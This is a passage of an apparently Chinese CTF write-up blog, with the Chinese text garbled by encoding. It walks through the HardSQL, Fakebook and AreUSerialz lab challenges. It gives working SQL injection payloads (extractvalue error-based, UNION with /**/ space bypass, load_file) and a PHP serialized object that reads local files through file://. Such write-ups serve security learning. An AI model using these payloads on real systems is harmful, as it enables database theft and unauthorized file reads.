&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; data &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;id&amp;#34;&lt;/span&gt;:payload
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; time&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sleep(&lt;span style="color:#ae81ff"&gt;0.3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; response &lt;span style="color:#f92672"&gt;=&lt;/span&gt; requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;post(url, data &lt;span style="color:#f92672"&gt;=&lt;/span&gt; data)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;Hello&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; response&lt;span style="color:#f92672"&gt;.&lt;/span&gt;text:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; low&lt;span style="color:#f92672"&gt;=&lt;/span&gt;mid&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; high &lt;span style="color:#f92672"&gt;=&lt;/span&gt; mid
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; mid &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (low&lt;span style="color:#f92672"&gt;+&lt;/span&gt;high)&lt;span style="color:#f92672"&gt;/&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; chr(int(mid))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(result)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#flag{929c8993-2d85-4fbf-8e48-7c457551105e}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019hardsql"&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307173126.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;è¿˜æ˜¯sqlæ³¨å…¥é¢˜ã€‚å°è¯•åœ¨è¾“å…¥æ¡†é‡Œè¾“å…¥&lt;code&gt;#&lt;/code&gt;ã€&lt;code&gt;--+&lt;/code&gt;æ—¶è¢«æ‹¦ä¸‹äº†ï¼Œä½†æ˜¯åœ¨urlä¸­ä½¿ç”¨%23é€šè¿‡äº†ã€‚å°è¯•äº†unionä½†æ˜¯è¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨åŒå†™ä¹Ÿä¸é€šè¿‡ï¼Œå’Œè¿™é“é¢˜åŒç±»å‹çš„é¢˜å‰é¢æœ‰Baby SQLã€Easy SQLï¼Œè€ƒç‚¹è¿˜å‰©ä¸‹çš„æœ‰ç›²æ³¨ã€æŠ¥é”™æ³¨å…¥ã€å †å æ³¨å…¥ã€‚å°è¯•æŠ¥é”™æ³¨å…¥å¯ä»¥ä½¿ç”¨ï¼Œæˆ‘å‚è€ƒçš„&lt;a class="link" href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener"
&gt;åç§MySQLæŠ¥é”™æ³¨å…¥&lt;/a&gt;ã€‚è¿˜éœ€è¦æ³¨æ„ç©ºæ ¼æ˜¯ä¼šè¢«æ‹¦ä¸‹çš„ï¼Œurlç¼–ç ä¹Ÿä¸èƒ½é€šè¿‡ï¼Œæ‰€ä»¥åœ¨è¯­å¥ä¸­çš„è¡¨åéœ€è¦ä½¿ç”¨&lt;code&gt;()&lt;/code&gt;éš”å¼€ï¼Œå…·ä½“payloadå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;çˆ†è¡¨&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;admin&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;27&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt;(extractvalue(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,concat(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e,(&lt;span style="color:#66d9ef"&gt;select&lt;/span&gt;(group_concat(&lt;span style="color:#66d9ef"&gt;table_name&lt;/span&gt;))&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt;(information_schema.tables)&lt;span style="color:#66d9ef"&gt;where&lt;/span&gt;(table_schema)&lt;span style="color:#66d9ef"&gt;like&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;database&lt;/span&gt;())),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e)))&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;23&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å½“å‰è¡¨åæ˜¯ï¼šH4rDsq1&lt;/p&gt;
&lt;ol start="2"&gt;
&lt;li&gt;çˆ†å­—æ®µ&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;admin&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;27&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt;(extractvalue(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,concat(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e,(&lt;span style="color:#66d9ef"&gt;select&lt;/span&gt;(group_concat(&lt;span style="color:#66d9ef"&gt;column_name&lt;/span&gt;))&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt;(information_schema.columns)&lt;span style="color:#66d9ef"&gt;where&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;table_name&lt;/span&gt;)&lt;span style="color:#66d9ef"&gt;like&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;H4rDsq1&amp;#39;&lt;/span&gt;)),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e)))&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;23&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å½“å‰è¡¨çš„å­—æ®µæœ‰ï¼šid,username,password&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å‡ºæ•°æ®&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¦‚æœä½¿ç”¨æ­£å¸¸çš„æŸ¥è¯¢è¯­å¥ä¼šå› ä¸ºflagçš„é•¿åº¦å¤ªé•¿ï¼Œé¡µé¢ä¸­çš„å›æ˜¾é•¿åº¦ä¸èƒ½æ˜¾ç¤ºå…¨ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨&lt;code&gt;left&lt;/code&gt;å’Œ&lt;code&gt;right&lt;/code&gt;å‡½æ•°ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¯­æ³•ï¼šLEFT(ARG,LENGTH)ã€RIGHT(ARG,LENGTH)&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;è¿™ä¸¤ä¸ªå‡½æ•°ä¼šç”¨åˆ°é€‰å–çš„é•¿åº¦ï¼Œå¦‚æœæƒ³è¦æ‹¼æˆä¸€ä¸ªå®Œæ•´çš„flagï¼Œå¯ä»¥å…ˆç”¨lengthæŸ¥çœ‹æ€»é•¿åº¦ï¼Œè®¡ç®—ä»¥åæ‹¼ä¸€ä¸‹&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;admin&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;27&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt;(extractvalue(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,concat(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e,(&lt;span style="color:#66d9ef"&gt;select&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;left&lt;/span&gt;(password,&lt;span style="color:#ae81ff"&gt;35&lt;/span&gt;))&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt;(H4rDsq1)),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e)))&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;23&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;flag{112bb5db-17a4-47e2-97b4-19&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;admin&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;27&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt;(extractvalue(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,concat(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e,(&lt;span style="color:#66d9ef"&gt;select&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;right&lt;/span&gt;(password,&lt;span style="color:#ae81ff"&gt;11&lt;/span&gt;))&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt;(H4rDsq1)),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e)))&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;23&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;dc295a017f}&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="ç½‘é¼æ¯-2018fakebook"&gt;[ç½‘é¼æ¯ 2018]Fakebook
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307174819.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æ˜¯ä¸€ä¸ªå±•ç¤ºè‡ªå·±åšå®¢ç½‘å€çš„åˆ—è¡¨ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ª&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307175313.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘å¡«çš„æ˜¯baiduçš„ç½‘å€23333ã€‚è¿™æ—¶çš„urlæ˜¯ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-url" data-lang="url"&gt;http://2cefe2a5-4e68-44ce-870c-3628c2500cd3.node3.buuoj.cn/view.php?no=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;çœ‹åˆ°äº†no=1ï¼Œåº”è¯¥æƒ³åˆ°äº†sqlæ³¨å…¥ï¼Œæˆ‘æ²¡æœ‰è¯•å‡ºä»€ä¹ˆåå ‚ï¼Œä½†æ˜¯åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªè¿™é“é¢˜çš„éé¢„æœŸè§£ï¼š[&lt;a class="link" href="https://www.cnblogs.com/kevinbruce656/p/12643338.html" target="_blank" rel="noopener"
&gt;ç½‘é¼æ¯2018]fakebooké¢˜è§£&lt;/a&gt;ï¼Œä½¿ç”¨äº†&lt;code&gt;load_file&lt;/code&gt;å‡½æ•°ç›´æ¥è¯»å–äº†flagæ–‡ä»¶ã€‚åŒæ ·æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨&lt;code&gt;/**/&lt;/code&gt;ç»•è¿‡ã€‚&lt;/p&gt;
&lt;h2 id="éé¢„æœŸè§£"&gt;éé¢„æœŸè§£
&lt;/h2&gt;&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1 union/**/select 1,2,3,4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å…ˆä½¿ç”¨ä¸Šé¢çš„è¯­å¥æŸ¥çœ‹å›æ˜¾ç‚¹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307180356.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æ‰¾çš„äº†ä½ç½®2çš„å›æ˜¾ç‚¹ï¼Œå¯ä»¥æŠŠå‡½æ•°æ›¿æ¢åœ¨2çš„ä½ç½®ä¸Šã€‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1 union/**/select 1,load_file(&amp;#39;/var/www/html/flag.php&amp;#39;),3,4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å‚è€ƒå¸ˆå‚…çš„åšå®¢ä¸­æ˜¯ä½¿ç”¨äº†ç›²æ³¨è·å¾—flagçš„ï¼Œå…¶å®æ‰§è¡Œä»¥åä½¿ç”¨é¡µé¢çš„é€‰å–å·¥å…·é€‰å–å›æ˜¾çš„æ ‡ç­¾å—ï¼Œå¯ä»¥åœ¨æ³¨é‡Šé‡Œæ‰¾çš„åˆ°ğŸ¤£&lt;/p&gt;
&lt;h2 id="é¢„æœŸè§£"&gt;é¢„æœŸè§£
&lt;/h2&gt;&lt;p&gt;æ­£å¸¸çš„sqlæ³¨å…¥ä¸€å¥—æŸ¥è¯¢ï¼ŒåŒæ ·æ˜¯ä½¿ç”¨&lt;code&gt;/**/&lt;/code&gt;ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ã€‚&lt;/p&gt;
&lt;p&gt;çˆ†è¡¨&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1%20union/***/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;çˆ†å­—æ®µ&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1 union/***/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&amp;#39;users&amp;#39; %23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å‡ºæ•°æ®&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1 union/***/select 1,group_concat(no,username,passwd,data),3,4 from users
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æŸ¥è¯¢çš„ç»“æœæ˜¯ä¸€å¤§ä¸²å­—ç¬¦ä¸²ï¼Œä½†æ˜¯åœ¨ç»“å°¾ä¸€ä¸ªPHPçš„åºåˆ—åŒ–å¯¹è±¡ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;O:8:&amp;#34;UserInfo&amp;#34;:3:{s:4:&amp;#34;name&amp;#34;;s:7:&amp;#34;guobang&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:18;s:4:&amp;#34;blog&amp;#34;;s:20:&amp;#34;http://www.baidu.com&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¯´æ˜ç½‘ç«™æ˜¯ä½¿ç”¨ååºåˆ—åŒ–è·å–å¯¹åº”æ çš„æ•°æ®ï¼Œä¸‹é¢æœ‰ä¸€ä¸ªiframeçš„æ ‡ç­¾ï¼Œæ ¹æ®æç¤º&lt;strong&gt;the contents of his/her blog&lt;/strong&gt;ï¼Œå¾—çŸ¥æˆ‘ä»¬æä¾›çš„ç½‘å€ä¼šåœ¨è¿™é‡Œæ˜¾ç¤ºï¼Œæ­£å¥½æœ‰ä¸€ä¸ªphpä¼ªåè®®file://å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæ€è·¯å°±æ˜¯ï¼š&lt;strong&gt;ä½¿ç”¨ä¼ªåè®®è¯»å–flagä½œä¸ºblogç½‘ç«™å›æ˜¾åœ¨iframeçš„æ ‡ç­¾ä¸­&lt;/strong&gt;ï¼Œæ‰€ä»¥æ„é€ ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡ã€‚&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UserInfo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;guobang&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $age &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;18&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $blog &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;file:///var/www/html/flag.php&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$s &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UserInfo&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($s);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//O:8:&amp;#34;UserInfo&amp;#34;:3:{s:4:&amp;#34;name&amp;#34;;s:7:&amp;#34;guobang&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:18;s:4:&amp;#34;blog&amp;#34;;s:29:&amp;#34;file:///var/www/html/flag.php&amp;#34;;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€ç»ˆpayload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1%20union/***/select%201,2,3,&amp;#39;O:8:&amp;#34;UserInfo&amp;#34;:3:{s:4:&amp;#34;name&amp;#34;;s:7:&amp;#34;guobang&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:18;s:4:&amp;#34;blog&amp;#34;;s:29:&amp;#34;file:///var/www/html/flag.php&amp;#34;;}&amp;#39; from%20users
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åœ¨iframeé‡Œé¢æ‰¾ï¼Œæ˜¯ä¸€ä¸ªdata:text/htmlçš„æ•°æ®æ ¼å¼ï¼Œbase64åŠ å¯†çš„å™¢ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz"&gt;[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz
&lt;/h1&gt;&lt;p&gt;éƒ¨åˆ†å›¾&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308102316.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æœ€ä¸‹é¢æœ‰å¯¹äºpayloadçš„é™åˆ¶ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;is_valid&lt;/span&gt;($s) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt;($i &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;; $i &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($s); $i&lt;span style="color:#f92672"&gt;++&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($s[$i]) &lt;span style="color:#f92672"&gt;&amp;gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;32&lt;/span&gt; &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($s[$i]) &lt;span style="color:#f92672"&gt;&amp;lt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;125&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET{&lt;span style="color:#e6db74"&gt;&amp;#39;str&amp;#39;&lt;/span&gt;})) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $str &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;string&lt;/span&gt;)$_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;str&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;is_valid&lt;/span&gt;($str)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $obj &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($str);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;éœ€è¦payloadä¸­çš„å­—ç¬¦asciiç å€¼&lt;code&gt;å¤§äº&lt;/code&gt;32&lt;code&gt;å°äº&lt;/code&gt;125ã€‚æ³¨æ„åˆ°æœ€åæœ‰ä¸€ä¸ª&lt;code&gt;unserialize&lt;/code&gt;å‡½æ•°ï¼Œåˆ¤æ–­è¿™é“é¢˜è€ƒç‚¹æ˜¯ååºåˆ—åŒ–ã€‚æ¥ä¸‹æ¥åˆ†ææºç ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;process()&lt;/code&gt;å‡½æ•°åˆ¤æ–­opçš„å€¼ï¼Œå¦‚æœæ˜¯&lt;code&gt;1&lt;/code&gt;å°±å†™å…¥æ–‡ä»¶ï¼Œå¦‚æœæ˜¯&lt;code&gt;2&lt;/code&gt;å°±è¯»å–æ–‡ä»¶ã€‚ä»£ç å¼€å¤´åŒ…å«äº†&lt;code&gt;flag.php&lt;/code&gt;æ–‡ä»¶ï¼Œæ‰€ä»¥æ¨æµ‹éœ€è¦ä½¿ç”¨2æ“ä½œæ•°è¯»å–flag.phpæ–‡ä»¶ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;write()&lt;/code&gt;æŠŠå¯¹è±¡ä¸­çš„&lt;code&gt;$content&lt;/code&gt;å±æ€§å€¼å†™å…¥åˆ°&lt;code&gt;$filename&lt;/code&gt;æ–‡ä»¶ä¸­ï¼Œå¦‚æœé•¿åº¦å¤§äº100ä¼šè¢«æ‹¦ä¸‹ã€‚&lt;/li&gt;
